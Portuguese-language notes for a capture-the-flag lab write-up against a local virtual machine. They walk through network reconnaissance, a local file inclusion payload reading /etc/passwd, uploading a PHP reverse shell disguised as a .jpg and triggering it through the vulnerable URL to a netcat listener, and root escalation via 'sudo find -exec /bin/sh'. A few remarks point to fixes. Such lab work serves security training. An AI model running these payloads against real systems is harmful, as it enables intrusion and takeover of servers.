# Tirar print de tudo da tela. Ate do tempo

Verificamos o nosso IP com esse comando.
ip -br -c a

E verificamos com o netdiscover os IPs que estao sendo utilizados na nossa rede.
netdiscover -i eth0 -P -r 192.168.56.0/24

Pingar o IP para verificar se ele esta aceitando requisicoes.
ping 192.168.56.103

Entramos em um browser para verificar o site que esta no ar.
// entrar no mozilla o site

Utilizar o nmap para verificar as portas abertas do servidor e os servidores rodando nela.
nmap -p- -sV 192.168.56.103

O servidor do servidor e um Apache, com um padrao de criacao de arquivos para web no path /var/www/html.
Um metodo para deixar o servidor mais seguro, seria modificar o path default do Apache para um outro.
# Porta 80 esta aberta e é uma PORTA OPEN com um 
# Apache httpd 2.4.29 ((Ubuntu)), ele cria /var/www/html, e para ajustar modificar a pagina de criação default do apache

// entrar no port swagger e ver a teoria

# achar a URL vuneravel

Ao procurar pelo site, foi possivel achar uma URL possivelmente vuneravel. Por causa que a url contem o ?nome=...
// http://192.168.56.103/language.php?lang=en.php

# porque tem o ?nome=....
# Agora tenta ler um arquivo com o LFI com por exemplo essa url

Testar a URL para verificar se ela realmente e vuneravel com essa URL. Se retornar o arquivo de passwd que e o arquivo de usuarios, isso significa que a URL e vuneravel.
// http://192.168.56.103/language.php?lang=../../../../etc/passwd

# Para ver bonito, clica em view page source
# Ir no portswigger e falar o que tem que fazer para trocar de coisa, dizer a vunerabilidade e o que tem que fazer para corrigir

Procurar no site por um local para fazer upload the arquivos.

Ao achar o local, tentar enviar um arquivo .php para testar se e possivel enviar um backdoor para o website.
Possivel ver que nao e possivel enviar um arquivo .php
// tentar inserir um arquivo .php, mas provavelmente retornara um erro porque ele apenas aceita arquivo .jpg

Contudo, podemos transformar o arquivo de backdoor para .jpg com esse comando
cp php-reverse-shell.php shell.php.jpg

// transformar o backdoor php em .jpg
// editar o arquivo /usr/share/webshells/php/php-reverse-shell.php

// cp php-reverse-shell.php shell.php.jpg

# Fazer o print do antes e do depois
// verificar nosso IP denovo
// e modificar o $ip do arquivo onde esta escrito CHANGE THIS para o nosso IP

// agora subir o arquivo shell.php.jpg


// verificar caminho onde foi o upload com o gobuster

gobuster dir -u 192.168.56.103 -w /usr/share/wordlists/dirb/big.txt

// clicar na url que o gobuster achou
// abrir a porta que esta no shell.php.jpg

nc -nlvp 1234

// clicar na image e dar print no error, porque o servidor esta bloqueando o bloqueando o backdoor de ser executado

// abrir o arquivo agora pela url vuneravel
// 192.168.56.103/language.php?lang=/uploads/shell.php.jpg

# Tira print de tudo, tanto dos comentarios com dos #, tbm, por exemplo, tanto da url vuneravel, como tambem entrando no servidor
# Agora voce esta conectado no servidor

// a limitacao de bash, para limitar o hacker para ele nao ver o historico dos comandos

// agora rode o comando no bash

python3 -c "import pty;pty.spawn('bin/bash')"

// entrar no home do bassam - /home/bassam
// tentar fazer cat user.txt

// porque tem sem permissao


// ir para a pagina no /var/www/html
// e entrar na pasta supersecret-for-aziz
// e verificar o cat bassam-pass.txt

// entrar no usuario bassam com o su bassam
// entrar no home do bassam no cat user.txt
// e fazer print na flag


// entrar no site https://gtfobins.github.io/

// aparece o error porque nao tem acesso
// Sorry, user bassam is not allowed to execute '/bin/su' as root on bassam-aziz.

// verificar os possiveis com o sudo com o sudo -l 

Matching Defaults entries for bassam on bassam-aziz:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bassam may run the following commands on bassam-aziz:
    (ALL : ALL) /usr/bin/find

// entrar no gtfobins e procurar o find

# O find tem erro de permissao no linux do ubuntu 18
# Limitar as pemissao do usuario

// rodar o comando

// sudo find . -exec /bin/sh \; -quit

// entrando com o root

// entrar no /root

// dar ls e dar cat flag.txt
